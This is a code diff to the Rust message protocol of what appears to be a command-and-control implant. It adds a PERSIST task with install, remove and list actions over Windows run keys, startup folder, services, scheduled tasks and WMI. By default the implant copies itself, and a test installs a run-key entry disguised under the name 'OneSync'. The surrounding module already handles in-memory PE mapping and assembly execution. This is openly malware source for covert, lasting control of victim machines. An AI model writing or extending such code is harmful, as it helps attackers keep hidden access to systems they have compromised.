@@ -37,6 +37,18 @@ pub mod task_kind {
     /// manual mapper with exit redirection (ABR-T027). `data` inline
     /// (48 KB cap) or `path` of an uploaded stage deleted after load.
     pub const RUNPE: u8 = 0x0B;
+    /// Host persistence install/remove/list by mechanism (ABR-T030).
+    pub const PERSIST: u8 = 0x0C;
+}
+
+/// Sub-actions of the PERSIST task kind (ABR-T030).
+pub mod persist_action {
+    /// Install the mechanism (copying the implant when `exe` is empty).
+    pub const INSTALL: u8 = 0x00;
+    /// Remove the mechanism's artifacts by name.
+    pub const REMOVE: u8 = 0x01;
+    /// Report the live state of every mechanism.
+    pub const LIST: u8 = 0x02;
 }
 
 /// Sub-actions of the DRIVER task kind (ABR-T013/T014).
@@ -169,6 +181,19 @@ pub enum TaskBody {
     RunPe {
         data: Vec<u8>,
         path: String,
+    },
+    /// Host persistence (ABR-T030): install/remove/list a mechanism.
+    /// `mechanism` is one of run-key, run-key-hklm, startup, service,
+    /// schtasks, wmi; `name` identifies the artifact (service name,
+    /// task name, registry value), `exe` optionally overrides the
+    /// installed binary (default: a copy of the implant itself),
+    /// `args` are the persisted command arguments.
+    Persist {
+        action: u8,
+        mechanism: String,
+        name: String,
+        exe: String,
+        args: String,
     },
     Exit,
 }
@@ -363,6 +388,20 @@ impl Message {
                         put_blob(&mut buf, data);
                         put_str(&mut buf, path);
                     }
+                    TaskBody::Persist {
+                        action,
+                        mechanism,
+                        name,
+                        exe,
+                        args,
+                    } => {
+                        put_u8(&mut buf, task_kind::PERSIST);
+                        put_u8(&mut buf, *action);
+                        put_str(&mut buf, mechanism);
+                        put_str(&mut buf, name);
+                        put_str(&mut buf, exe);
+                        put_str(&mut buf, args);
+                    }
                     TaskBody::ExecuteAssembly {
                         data,
                         type_name,
@@ -459,6 +498,13 @@ impl Message {
                     task_kind::RUNPE => TaskBody::RunPe {
                         data: r.blob()?,
                         path: r.string()?,
+                    },
+                    task_kind::PERSIST => TaskBody::Persist {
+                        action: r.u8()?,
+                        mechanism: r.string()?,
+                        name: r.string()?,
+                        exe: r.string()?,
+                        args: r.string()?,
                     },
                     task_kind::EXECASM => TaskBody::ExecuteAssembly {
                         data: r.blob()?,
@@ -617,6 +663,16 @@ mod tests {
             body: TaskBody::RunPe {
                 data: Vec::new(),
                 path: "C:\\stage\\p.exe".into(),
+            },
+        }));
+        roundtrip(Message::Task(Task {
+            id: 12,
+            body: TaskBody::Persist {
+                action: persist_action::INSTALL,
+                mechanism: "run-key".into(),
+                name: "OneSync".into(),
+                exe: String::new(),
+                args: "--bg".into(),
             },
         }));
         roundtrip(Message::TaskResult(TaskResult {
